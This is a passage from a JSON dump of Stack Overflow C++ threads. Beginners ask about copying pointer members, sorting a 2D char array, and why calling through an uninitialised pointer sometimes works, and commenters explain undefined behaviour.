QObject::connect(&amp;console, SIGNAL(signalStart()), &amp;console, SLOT(consoleMain()));\n    QObject::connect(&amp;console, SIGNAL(signalEnd()), &amp;a, SLOT(quit()));\n    QObject::connect(&amp;watcher, SIGNAL(fileChanged(QString)), &amp;console, SLOT(slotFileChanged(QString)));\n\n    QTimer::singleShot(0, &amp;console, SLOT(slotEmit()));\n    //emit console.signalStart();\n\n    std::cout &lt;&lt; \"Enter main event loop now\" &lt;&lt; std::endl;\n    return a.exec();\n}\n</code></pre>\n"}, {"tags": ["c++"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 3, "creation_date": 1429733347, "post_id": 29807750, "comment_id": 47743718, "body": "What do you think it does?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1429733377, "post_id": 29807750, "comment_id": 47743736, "body": "Why don&#39;t you tell us what you think it does, then we&#39;ll correct you if you&#39;re wrong. You&#39;ll learn better that way."}, {"owner": {"reputation": 4010, "user_id": 1812187, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/MRXi9.png?s=128&g=1", "display_name": "Carlton", "link": "https://stackoverflow.com/users/1812187/carlton"}, "edited": false, "score": 0, "creation_date": 1429733511, "post_id": 29807750, "comment_id": 47743817, "body": "This is C++, btw, not C."}, {"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 0, "creation_date": 1429733719, "post_id": 29807750, "comment_id": 47743922, "body": "<code>Could anyone please tell me what exactly this program does?</code>  We have no idea what your real level of knowledge is.  Do you know what <code>main()</code> is?  Do you know what a <code>class</code> is?  Do you know what member variables are?  Do you know what <code>new</code> does?  Etc..etc.. So it makes no sense to ask &quot;what this program does&quot; until you tell us what particular part of the program you don&#39;t understand."}, {"owner": {"reputation": 43, "user_id": 2848661, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/9ece6170e8c2634dfe931d09f7a925f2?s=128&d=identicon&r=PG&f=1", "display_name": "Katty Jackson", "link": "https://stackoverflow.com/users/2848661/katty-jackson"}, "edited": false, "score": 0, "creation_date": 1429733751, "post_id": 29807750, "comment_id": 47743941, "body": "I think we area making a pointer type object and copying the value of pointer *s into s1. Similarly in the next step s2 = s1, we are putting the value of s1 into s2."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 3, "creation_date": 1429734234, "post_id": 29807750, "comment_id": 47744221, "body": "Short answer: Nothing. Longer answer: Nothing useful or nothing harmful besides wasting CPU cycles and allocations (if not optimized away)"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429735062, "post_id": 29807938, "comment_id": 47744733, "body": "Please notice s1 and s2 are between <code>new s</code> and <code>delete s</code>"}, {"owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "edited": false, "score": 0, "creation_date": 1429735903, "post_id": 29807938, "comment_id": 47745217, "body": "@DieterL&#252;cking Yes, but they are local variables, so they are valid and accessible as long as <code>main</code> executes and after <code>delete</code> they may still be used to perform further actions on (now) invalid memory. Perhaps such explanation was expected? As hypothetical employer, I would be very happy if my potential employee was aware of such things."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1491323187, "post_id": 29807938, "comment_id": 73497134, "body": "Given that <code>name</code> is a wild (uninitialized) pointer, and it&#39;s never dereferenced or freed, then we don&#39;t actually hit any Undefined Behaviour.  But then, why have that member at all?"}], "tags": [], "owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "is_accepted": false, "score": 1, "last_activity_date": 1429733817, "creation_date": 1429733817, "answer_id": 29807938, "question_id": 29807750, "link": "https://stackoverflow.com/questions/29807750/output-of-a-pointer-based-program/29807938#29807938", "title": "Output of a pointer based program", "body": "<p>For classes with no user-defined assignment operator (copy constructor), compiler generates the default one (ones), which assigns (copies) all members by simple assignment. So, in case of student, default <code>operator=</code> would look like this:</p>\n\n<pre><code>Student&amp; operator=(const Strudent&amp; rhs)\n{\n    this-&gt;name = rhs.name;\n}\n</code></pre>\n\n<p>While copy constructor:</p>\n\n<pre><code>Student(const Student&amp; origin)\n: name(origin.name)\n{\n}\n</code></pre>\n\n<p>This means, that just before this line:</p>\n\n<pre><code>delete s;\n</code></pre>\n\n<p><code>s</code>, <code>s1</code> and <code>s2</code> have their <code>name</code> pointed to exactly the same memory location. If <code>s</code> contained any allocated data there, using it inside <code>s1</code> or <code>s2</code> after <code>delete</code> would lead to cataclysm.</p>\n"}, {"tags": [], "owner": {"reputation": 141, "user_id": 2864439, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d08d0ac7b93bd7e028973b028e727bf?s=128&d=identicon&r=PG&f=1", "display_name": "tetorea", "link": "https://stackoverflow.com/users/2864439/tetorea"}, "is_accepted": false, "score": 0, "last_activity_date": 1429735475, "creation_date": 1429735475, "answer_id": 29808428, "question_id": 29807750, "link": "https://stackoverflow.com/questions/29807750/output-of-a-pointer-based-program/29808428#29808428", "title": "Output of a pointer based program", "body": "<pre><code>#include &lt;iostream&gt;\n</code></pre>\n\n<p>Tell the compiler the program will use some functions defined in the library iostream</p>\n\n<pre><code>using namespace std;\n</code></pre>\n\n<p>Tell the compiler to use the std namespace. Basically, we don't need to write \"std.\" before functions defined in the std namespace anymore with this command.</p>\n\n<pre><code>class Student {\n  private:\n    char *name;\n};\n</code></pre>\n\n<p>Define a new class named 'Student' which contains a single variable named 'name'.\n'name' is private and thus can only be accessed by members of the class.\n'name' is pointer to char and thus can be used to point to arrays of characters.</p>\n\n<pre><code>int main()\n{\n</code></pre>\n\n<p>Start the definition of the main program, the entry point of our program</p>\n\n<pre><code>Student *s = new Student();\n</code></pre>\n\n<p>Define a pointer to a Student object named s.\n'new Student()' allocates memory for a Student object.\ns stores the address of the allocated memory.\nNote: the variable 'name' in the Student class pointed by s is not initialized.</p>\n\n<pre><code>Student s1 = *s;\n</code></pre>\n\n<p>Define a new Student object s1 and initialize it by copying the Student object pointed by s. \nThe variable 'name' in s1 copy the (not-initialized!) value of the variable 'name' in the Student class pointed by s.</p>\n\n<pre><code>Student s2;\n</code></pre>\n\n<p>Define a new Student object s2.\ns2 is initialized by default.</p>\n\n<pre><code>s2 = s1;\n</code></pre>\n\n<p>initialize s2 by copying s1</p>\n\n<pre><code>delete s;\n</code></pre>\n\n<p>delete the Student object allocated in the memory space pointed by s</p>\n\n<pre><code>return 0;\n</code></pre>\n\n<p>end the program by returning 0 to the calling process</p>\n"}], "owner": {"reputation": 43, "user_id": 2848661, "user_type": "registered", "accept_rate": 8, "profile_image": "https://www.gravatar.com/avatar/9ece6170e8c2634dfe931d09f7a925f2?s=128&d=identicon&r=PG&f=1", "display_name": "Katty Jackson", "link": "https://stackoverflow.com/users/2848661/katty-jackson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "answer_count": 2, "score": -8, "last_activity_date": 1429735475, "creation_date": 1429733200, "last_edit_date": 1429733570, "question_id": 29807750, "link": "https://stackoverflow.com/questions/29807750/output-of-a-pointer-based-program", "title": "Output of a pointer based program", "body": "<p>I was asked this question in my interview. I am a newbie in C++ and this program compiles successfully. Could anyone please tell me what exactly this program does?</p>\n\n<pre><code>#include &lt;iostream&gt;\nusing namespace std;\nclass Student {\n   private:\n      char *name;\n};\nint main() {\n   Student *s = new Student();\n   Student s1 = *s;\n   Student s2;\n   s2 = s1;\n   delete s;\n\n   return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "arrays", "function", "sorting", "lvalue"], "comments": [{"owner": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "edited": false, "score": 1, "creation_date": 1429734077, "post_id": 29807737, "comment_id": 47744123, "body": "Is there a reason you are using a 2d array of chars instead of a vector of strings?"}, {"owner": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "reply_to_user": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "edited": false, "score": 0, "creation_date": 1429734145, "post_id": 29807737, "comment_id": 47744178, "body": "yes, unfortunately a requirement for this assignment"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1429735507, "post_id": 29807737, "comment_id": 47744974, "body": "That&#39;s not a very C++ assignment, then is, it?"}, {"owner": {"reputation": 161, "user_id": 3936520, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6a77fc56e8f2a5b32a44cd2e18ca671?s=128&d=identicon&r=PG&f=1", "display_name": "Vincent LE GARREC", "link": "https://stackoverflow.com/users/3936520/vincent-le-garrec"}, "edited": false, "score": 0, "creation_date": 1429735797, "post_id": 29807737, "comment_id": 47745138, "body": "Maybe this can help you, especially the first answer: <a href=\"http://stackoverflow.com/questions/4118732/c-array-assign-error-invalid-array-assignment\" title=\"c array assign error invalid array assignment\">stackoverflow.com/questions/4118732/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "edited": false, "score": 0, "creation_date": 1429735912, "post_id": 29808423, "comment_id": 47745221, "body": "I&#39;m trying to understand this, but having a little bit of trouble. the arrays are both fixed sized and the same size, I see that. But what I don&#39;t understand is, if you are assigning a = b, if they are the same fixed size, why doesn&#39;t it work? Excuse my ignorance, still learning."}, {"owner": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "reply_to_user": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "edited": false, "score": 0, "creation_date": 1429736224, "post_id": 29808423, "comment_id": 47745444, "body": "@Dpry12 <a href=\"http://stackoverflow.com/questions/3437110/why-does-c-support-memberwise-assignment-of-arrays-within-structs-but-not-gen\" title=\"why does c support memberwise assignment of arrays within structs but not gen\">stackoverflow.com/questions/3437110/&hellip;</a>"}], "tags": [], "owner": {"reputation": 3004, "user_id": 1359034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e97eaac4d6ba8f0c3f95900f02b45b42?s=128&d=identicon&r=PG", "display_name": "dwcanillas", "link": "https://stackoverflow.com/users/1359034/dwcanillas"}, "is_accepted": true, "score": 3, "last_activity_date": 1429736254, "last_edit_date": 1429736254, "creation_date": 1429735449, "answer_id": 29808423, "question_id": 29807737, "link": "https://stackoverflow.com/questions/29807737/c-passing-values-to-2d-char-array-in-a-function/29808423#29808423", "title": "C++ Passing values to 2D char array in a function", "body": "<p>Your main problem here is that you are trying to use an assignment operator on two fixed sized arrays, which isn't legal.  Consider the following code:</p>\n\n<pre><code>int a[2] = {0, 0};\nint b[2] = {1, 1};\n\na = b;\n</code></pre>\n\n<p>This gives the same error you are getting.  On the lines you mentioned, you are doing the same thing with <code>char[15]</code> arrays.</p>\n\n<p>To fix your problems, you either need to allocate your <code>char</code> array dynamically/work with the pointers, or a simpler solution would be to just change your <code>char[][]</code> array to a <code>string[]</code> array.</p>\n\n<p>That being said, there are a lot of things you can clean up here:</p>\n\n<ul>\n<li>You have a few variables declared globally that can just be defined in main or lower</li>\n<li>You can declare loop counters inside the <code>for</code> loop instead of beforehand, as you do in the <code>sortNames</code> function</li>\n<li>In <code>sortNames</code> you are declaring a few variables twice</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "edited": false, "score": 0, "creation_date": 1429736634, "post_id": 29808562, "comment_id": 47745680, "body": "getting an error at the arr[i] = temp.c_str(); part, saying &quot;Const char*&quot; cannot be assigned to an entity of type &quot;char *&quot;...another error I don&#39;t understand lol"}, {"owner": {"reputation": 61, "user_id": 3925334, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90da0f71a8aba9a602076609f0ab211f?s=128&d=identicon&r=PG&f=1", "display_name": "ivor-c", "link": "https://stackoverflow.com/users/3925334/ivor-c"}, "reply_to_user": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "edited": false, "score": 0, "creation_date": 1429737118, "post_id": 29808562, "comment_id": 47745931, "body": "Hmm, sorry, my advice was wrong. Try this instead for getting strings from the user: <a href=\"http://stackoverflow.com/questions/9755100/getting-console-input-for-cstrings\" title=\"getting console input for cstrings\">stackoverflow.com/questions/9755100/&hellip;</a>"}], "tags": [], "owner": {"reputation": 61, "user_id": 3925334, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90da0f71a8aba9a602076609f0ab211f?s=128&d=identicon&r=PG&f=1", "display_name": "ivor-c", "link": "https://stackoverflow.com/users/3925334/ivor-c"}, "is_accepted": false, "score": 0, "last_activity_date": 1429737274, "last_edit_date": 1495541661, "creation_date": 1429735906, "answer_id": 29808562, "question_id": 29807737, "link": "https://stackoverflow.com/questions/29807737/c-passing-values-to-2d-char-array-in-a-function/29808562#29808562", "title": "C++ Passing values to 2D char array in a function", "body": "<p>I'll add a few things to dwcanilla's answer.</p>\n\n<p>You will want to change your function prototypes and headers to something more like this:</p>\n\n<pre><code>void getNames(char ** &amp; arr, int val);\nvoid sortNames(char ** &amp; arr);\n</code></pre>\n\n<p>What this means is that the function accepts a reference to an array of c-strings; that is, when you work with the array within the function you are modifying the actual array you passed and not just a copy. Also I think you'd be fine just passing the integer by value for getNames.</p>\n\n<p>Second, global variables are generally a bad idea. Since you can pass the array reference directly to your functions you may want to declare nameArr and your other global variables inside main instead.</p>\n\n<p>Third, in getNames you won't be able to use cin to assign your c-strings directly. </p>\n\n<p>EDIT: This is a better way -- \n<a href=\"https://stackoverflow.com/questions/9755100/getting-console-input-for-cstrings\">getting console input for Cstrings</a></p>\n\n<p>Finally, the &lt; operator doesn't work on c-strings the way you're using it in your sort function. Use <a href=\"http://www.cplusplus.com/reference/cstring/strcmp/\" rel=\"nofollow noreferrer\">strcmp()</a> instead (and be sure to include the cstring header):</p>\n\n<pre><code>if(strcmp(arr[ii], arr[jj]) &gt; 0)\n</code></pre>\n"}], "owner": {"reputation": 105, "user_id": 4797414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b143767bbf8d0ceb0483bd645bea5be4?s=128&d=identicon&r=PG&f=1", "display_name": "Dpry12", "link": "https://stackoverflow.com/users/4797414/dpry12"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1041, "favorite_count": 0, "accepted_answer_id": 29808423, "answer_count": 2, "score": 0, "last_activity_date": 1429737274, "creation_date": 1429733150, "last_edit_date": 1429735346, "question_id": 29807737, "link": "https://stackoverflow.com/questions/29807737/c-passing-values-to-2d-char-array-in-a-function", "title": "C++ Passing values to 2D char array in a function", "body": "<p>I am trying to use a function to sort through a char array full of words. The current issue I am having is that in my sortNames function I am getting the error, \"expression must be a modifiable lvalue\" at the part below</p>\n\n<pre><code>hold = nameArr[ii];\nnameArr[ii] = nameArr[jj];\nnameArr[jj] = hold;\n</code></pre>\n\n<p>I am guessing that its because I am trying to pass values through an array for some reason. I am struggling with understanding references and pointers and the such, and I imagine that is hurting me here as well. Any help with this would be fantastic, thank you in advance. </p>\n\n<p>Here is my current code...</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nchar nameArr[20][15];           // array to store the 20 values\nint val = 0;                    // variable to pass values to the array\nint x = 0;                      // loop counter outside functions\n\n//Function prototypes\nvoid getNames(char (&amp;nameArr)[20][15], int &amp;val);\nvoid sortNames( char(&amp;nameArr)[20][15]);\n\n//getNames Function\nvoid getNames(char (&amp;nameArr)[20][15], int &amp;val)\n{\n    int i = 0;                  // loop counter\n\n    cout &lt;&lt; \"Awesome, now lets input those names...\\n\" &lt;&lt; endl; \n\n    for (i = 0; i &lt; val; i++)\n    {\n        cout &lt;&lt; \"\\nNAME \" &lt;&lt; i+1 &lt;&lt; \": \" &lt;&lt; ' ';\n        cin &gt;&gt; nameArr[i];\n    }\n\n    cout &lt;&lt; \"\\n\\n\\nThese are the names that you inserted:\\n\" &lt;&lt; endl;\n\n    for (i = 0; i &lt; val; i++)\n    {\n         cout &lt;&lt; nameArr[i] &lt;&lt; \"\\n\" &lt;&lt; endl;\n    }\n}\n\n// sortNames function\nvoid sortNames( char(&amp;nameArr)[20][15])\n{\n    int n = 15;             // max length of word\n    int ii = 0;             // loop counter\n    int jj = 0;             // other counter\n    string hold;            // holding array\n\n    for (int ii = 0 ; ii &lt; n ; ii++) \n    {   \n         for (int jj = ii + 1; jj &lt; n; jj++) \n        {\n             if (nameArr[ii] &gt; nameArr[jj])\n            {\n                hold = nameArr[ii];\n                nameArr[ii] = nameArr[jj];\n                nameArr[jj] = hold;\n            }\n        }\n    }\n}\n\n\nint main()\n{\n    cout &lt;&lt; \"NAME SORTER!\\n\\nPlease enter in the amount of names you wish to enter: \" &lt;&lt; ' ';\n    cin &gt;&gt; val;\n\n    getNames(nameArr, val);\n\n    cout &lt;&lt; \"\\n\\n\\nAlright, lets sort now...\" &lt;&lt; endl;\n\n    sortNames(nameArr);\n\n    cout &lt;&lt; \"\\nHere are the results:\\n\" &lt;&lt; endl;\n\n    for (x = 0; x &lt; val; x++)\n    {\n         cout &lt;&lt; nameArr[x] &lt;&lt; \"\\n\" &lt;&lt; endl;\n    }\n\n    system(\"pause\");\n }\n</code></pre>\n"}, {"tags": ["c++", "oop", "computer-architecture"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 3, "creation_date": 1429733147, "post_id": 29807652, "comment_id": 47743568, "body": "&quot;C makes it easy to shoot yourself in the foot; C++ makes it harder, but when you do it blows your whole leg off. &quot;  --- by someone"}, {"owner": {"reputation": 4654, "user_id": 332733, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BR7yE.jpg?s=128&g=1", "display_name": "Mgetz", "link": "https://stackoverflow.com/users/332733/mgetz"}, "edited": false, "score": 1, "creation_date": 1429733229, "post_id": 29807652, "comment_id": 47743631, "body": "Related: <a href=\"http://stackoverflow.com/a/29151144/332733\">stackoverflow.com/a/29151144/332733</a>"}, {"owner": {"reputation": 1404, "user_id": 1592481, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/745cdde33a0435d5ef8065b97894ca39?s=128&d=identicon&r=PG", "display_name": "rpsml", "link": "https://stackoverflow.com/users/1592481/rpsml"}, "edited": false, "score": 0, "creation_date": 1429733951, "post_id": 29807652, "comment_id": 47744041, "body": "Also note that in <code>human* p, p1;</code> only <code>p</code> is a pointer. If you want both to be pointers then use <code>human *p, *p1;</code>"}, {"owner": {"reputation": 18565, "user_id": 10593, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3eeb7653c4df9b0f1332b9b0ec201ec?s=128&d=identicon&r=PG", "display_name": "Max Lybbert", "link": "https://stackoverflow.com/users/10593/max-lybbert"}, "edited": false, "score": 1, "creation_date": 1429734879, "post_id": 29807652, "comment_id": 47744614, "body": "The &quot;C makes it easy to shoot yourself in the foot&quot; quote is at <a href=\"http://stroustrup.com/bs_faq.html#really-say-that\" rel=\"nofollow noreferrer\">stroustrup.com/bs_faq.html#really-say-that</a> ."}], "answers": [{"comments": [{"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 1, "creation_date": 1429733337, "post_id": 29807735, "comment_id": 47743711, "body": "Note: <code>thus it works okay.</code> Yes, this is why it works in this case, but this doesn&#180;t mean it&#180;s correct. What OP&#180;s doing is to call a function which doesn&#180;t depend in any way on p or p1, so the compiler generates a function call without being interested in these variables at all. But it doesn&#180;t have to. It may crash (or anything else)"}, {"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 1, "creation_date": 1429733352, "post_id": 29807735, "comment_id": 47743722, "body": "Just to be clear here <code>it works ok</code> should really read <code>it happens to work ok this time, it may not next time</code>. Undefined behaviour is a fickle thing and should really be avoided."}, {"owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1429733455, "post_id": 29807735, "comment_id": 47743785, "body": "@deviantfan: yes this kind of behavior is not okay- my answer is more towards why there was no seg fault. About coding this is not how it should be coded and should be flagged in code reviews"}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1429733534, "post_id": 29807735, "comment_id": 47743829, "body": "@Sarang Don&#180;t worry, I know what you meant. My comment was more for the OP and other readers."}, {"owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "reply_to_user": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 0, "creation_date": 1429733539, "post_id": 29807735, "comment_id": 47743832, "body": "@MikeVine: thanks- i have made the edits to text"}, {"owner": {"reputation": 13, "user_id": 4821177, "user_type": "registered", "profile_image": "https://graph.facebook.com/454012494768096/picture?type=large", "display_name": "Ftube", "link": "https://stackoverflow.com/users/4821177/ftube"}, "edited": false, "score": 0, "creation_date": 1429745434, "post_id": 29807735, "comment_id": 47749518, "body": "Brilliant answer pointing to the vtable."}, {"owner": {"reputation": 13, "user_id": 4821177, "user_type": "registered", "profile_image": "https://graph.facebook.com/454012494768096/picture?type=large", "display_name": "Ftube", "link": "https://stackoverflow.com/users/4821177/ftube"}, "edited": false, "score": 0, "creation_date": 1429745636, "post_id": 29807735, "comment_id": 47749592, "body": "So is that equivalent to say I can treat the any class with virtual method as a &#39;hidden member variable(which is an array, vtable) embedded&#39;, therefore any wild pointer that access to the virtual member contained class would cause exception? (Simply to say any virtual class are implicitly NOT POD.)@Sarang"}, {"owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "edited": false, "score": 0, "creation_date": 1429746586, "post_id": 29807735, "comment_id": 47749908, "body": "Yes, see <a href=\"http://stackoverflow.com/questions/146452/what-are-pod-types-in-c\" title=\"what are pod types in c\">stackoverflow.com/questions/146452/what-are-pod-types-in-c</a> for details about pod types"}], "tags": [], "owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "is_accepted": true, "score": 3, "last_activity_date": 1429733373, "last_edit_date": 1429733373, "creation_date": 1429733144, "answer_id": 29807735, "question_id": 29807652, "link": "https://stackoverflow.com/questions/29807652/why-does-an-uninitialised-pointer-work-in-c-programs/29807735#29807735", "title": "WHY does an uninitialised pointer work in C++ programs?", "body": "<p>In first case, your class is a POD (plain old data) and your chat function does not dereference/access any member variable- thus it appears to work okay (this is a bad practice though- due to undefined behavior). In case of <a href=\"http://en.wikipedia.org/wiki/Virtual_method_table\" rel=\"nofollow\">virtual functions each object has vtable</a>, which needs a valid pointer to work- thus leads to fault.</p>\n\n<p>Here is how you can make your first case fault as well:</p>\n\n<pre><code>class Human \n{ \n    private:\n        int n;\n    public:\n\n    void chat(Human h) \n    {\n        cout &lt;&lt; \"human #\" &lt;&lt; n &lt;&lt; endl;\n    }\n\n    void chat(ComputerScientist c) \n    {\n        cout &lt;&lt; \"computer\";\n    }\n};\n\nclass ComputerScientist:public Human{};\n\nint main()\n{\n    Human* p,p1;\n    //Uninitialized pointer above;\n    p-&gt;chat(p1);//It shows perfectly the result without ANY error!\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 71857, "user_id": 47453, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/412dc332ab3593c636e5a5202cf98870?s=128&d=identicon&r=PG", "display_name": "Bill Lynch", "link": "https://stackoverflow.com/users/47453/bill-lynch"}, "is_accepted": false, "score": 4, "last_activity_date": 1429733452, "creation_date": 1429733452, "answer_id": 29807823, "question_id": 29807652, "link": "https://stackoverflow.com/questions/29807652/why-does-an-uninitialised-pointer-work-in-c-programs/29807823#29807823", "title": "WHY does an uninitialised pointer work in C++ programs?", "body": "<p>The code you've written exhibits <strong>undefined behavior</strong>. Code that is experiencing <strong>undefined behavior</strong> may:</p>\n\n<ul>\n<li>segmentation fault</li>\n<li>output weird characters to the screen.</li>\n<li>vary over different optimization levels and compilers</li>\n<li>work exactly as you wanted it to.</li>\n</ul>\n"}], "owner": {"reputation": 13, "user_id": 4821177, "user_type": "registered", "profile_image": "https://graph.facebook.com/454012494768096/picture?type=large", "display_name": "Ftube", "link": "https://stackoverflow.com/users/4821177/ftube"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "closed_date": 1429733474, "accepted_answer_id": 29807735, "answer_count": 2, "score": -2, "last_activity_date": 1429742053, "creation_date": 1429732859, "last_edit_date": 1429742053, "question_id": 29807652, "link": "https://stackoverflow.com/questions/29807652/why-does-an-uninitialised-pointer-work-in-c-programs", "closed_reason": "Duplicate", "title": "WHY does an uninitialised pointer work in C++ programs?", "body": 